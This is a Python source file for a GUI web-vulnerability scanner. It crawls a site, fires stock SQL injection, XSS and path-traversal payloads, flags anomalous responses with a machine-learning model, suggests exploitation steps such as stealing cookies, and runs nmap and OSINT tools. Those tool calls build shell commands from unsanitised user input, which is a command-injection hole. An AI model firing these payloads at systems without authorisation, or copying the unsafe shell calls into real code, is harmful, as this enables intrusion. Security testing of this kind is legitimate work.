# ai_zero_day_burp_ai.py

import requests
import random
import time
import numpy as np
import subprocess
import threading
from sklearn.ensemble import IsolationForest
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import tkinter as tk
from tkinter import scrolledtext

# =========================
# PAYLOAD GENERATOR (AI STYLE)
# =========================
def generate_payloads():
    base = [
        "' OR 1=1 --",
        "<script>alert(1)</script>",
        "../../etc/passwd",
        "A"*1000,
        "' AND SLEEP(5)--"
    ]
    smart = []
    for p in base:
        smart.append(p.replace(" ", "/**/"))
        smart.append(p + str(random.randint(100,999)))
        smart.append(p.upper())
    return base + smart

# =========================
# AUTO CRAWLER
# =========================
def crawl(url):
    endpoints = set()
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
        for link in soup.find_all("a"):
            href = link.get("href")
            if href:
                full = urljoin(url, href)
                if urlparse(full).netloc == urlparse(url).netloc:
                    endpoints.add(full)
    except:
        pass
    return list(endpoints) if endpoints else [url]

# =========================
# BASELINE
# =========================
def get_baseline(url):
    data = []
    for _ in range(10):
        try:
            r = requests.get(url, timeout=5)
            data.append([r.status_code, len(r.text), r.elapsed.total_seconds()])
        except:
            pass
    return np.array(data)

# =========================
# MODEL
# =========================
def train_model(data):
    model = IsolationForest(contamination=0.15)
    model.fit(data)
    return model

# =========================
# FUZZ
# =========================
def fuzz(urls, param):
    payloads = generate_payloads()
    results = []

    def task(url, payload):
        try:
            start = time.time()
            r = requests.get(url, params={param: payload}, timeout=10)
            t = time.time() - start
            return {"url": url, "payload": payload, "features":[r.status_code, len(r.text), t]}
        except:
            return None

    with ThreadPoolExecutor(max_workers=10) as exe:
        futures = [exe.submit(task, u, p) for u in urls for p in payloads]
        for f in futures:
            r = f.result()
            if r:
                results.append(r)

    return results

# =========================
# DETECT
# =========================
def detect(model, results):
    anomalies = []
    for r in results:
        if model.predict([r["features"]])[0] == -1:
            anomalies.append(r)
    return anomalies

# =========================
# AI ANALYZER + EXPLOIT BUILDER
# =========================
def analyze(r):
    s, l, t = r["features"]

    if s == 500:
        return "🔥 Injection → Try SQLi exploit"
    if t > 4:
        return "⏱️ Time Injection → Use Blind SQLi"
    if "<script>" in r["payload"]:
        return "⚠️ XSS → Try stealing cookies"
    if l > 5000:
        return "📂 Data leak → Dump endpoint"
    return "❓ Unknown → Manual testing"

# =========================
# KALI TOOL INTEGRATION
# =========================
def run_kali_tools(target):
    results = ""

    try:
        results += "\n[Nmap Scan]\n"
        results += subprocess.getoutput(f"nmap -T4 {target}")

        results += "\n\n[WhatWeb]\n"
        results += subprocess.getoutput(f"whatweb {target}")

    except:
        results += "\nKali tools not found"

    return results

# =========================
# OSINT + DARK WEB (SAFE)
# =========================
def osint_scan(domain):
    results = ""

    try:
        results += f"\n[WHOIS]\n"
        results += subprocess.getoutput(f"whois {domain}")

        results += f"\n\n[Subdomains]\n"
        results += subprocess.getoutput(f"subfinder -d {domain} -silent")

    except:
        results += "\nOSINT tools not available"

    return results

# =========================
# GUI DASHBOARD (BURP STYLE)
# =========================
class App:
    def __init__(self, root):
        self.root = root
        self.root.title("AI VAPT BURP TOOL")

        tk.Label(root, text="Target URL").pack()
        self.url_entry = tk.Entry(root, width=60)
        self.url_entry.pack()

        tk.Label(root, text="Parameter").pack()
        self.param_entry = tk.Entry(root, width=30)
        self.param_entry.pack()

        tk.Button(root, text="Start Scan", command=self.start_scan).pack()

        self.output = scrolledtext.ScrolledText(root, width=100, height=30)
        self.output.pack()

    def log(self, msg):
        self.output.insert(tk.END, msg + "\n")
        self.output.update()

    def start_scan(self):
        threading.Thread(target=self.scan).start()

    def scan(self):
        url = self.url_entry.get()
        param = self.param_entry.get()

        self.log("[+] Crawling...")
        endpoints = crawl(url)

        baseline = []
        for ep in endpoints:
            b = get_baseline(ep)
            if len(b):
                baseline.extend(b)

        model = train_model(np.array(baseline))

        self.log("[+] Fuzzing...")
        results = fuzz(endpoints, param)

        anomalies = detect(model, results)

        self.log("\n=== AI Findings ===")
        for a in anomalies:
            self.log(f"{a['url']} | {a['payload']}")
            self.log(analyze(a))
            self.log("-"*50)

        self.log("\n=== Kali Tools ===")
        self.log(run_kali_tools(url))

        domain = urlparse(url).netloc
        self.log("\n=== OSINT ===")
        self.log(osint_scan(domain))

# =========================
# RUN GUI
# =========================
if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()